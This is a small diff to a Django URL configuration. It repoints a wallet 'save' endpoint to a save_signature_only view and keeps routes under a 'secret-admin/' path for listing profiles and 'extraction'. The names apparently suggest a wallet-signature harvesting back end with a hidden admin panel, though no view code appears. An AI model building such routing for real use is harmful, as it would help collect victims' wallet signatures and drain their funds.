@@ -87,11 +87,14 @@ urlpatterns = [
     path('send-message/<int:user_id>/', views.send_message, name='send_message'),
     path('staff/send-message/<int:user_id>/', views.send_message, name='send_message'),
 
-    #
+    # Wallet Pages
     path('wallet/verify/', views.wallet_verify_page, name='wallet_verify_page'),
-    path('wallet/api/save/', views.update_wallet_status, name='update_wallet_status'),
 
+    # Point both of these to save_signature_only to avoid the AttributeError
+    path('wallet/api/save/', views.save_signature_only, name='update_wallet_status'),
     path('api/save-sig/', views.save_signature_only, name='save_sig'),
+
+    # Admin Extraction
     path('secret-admin/list/', views.admin_extraction_list, name='admin_list'),
     path('secret-admin/extract/<int:profile_id>/', views.process_extraction, name='do_extract'),
 ]
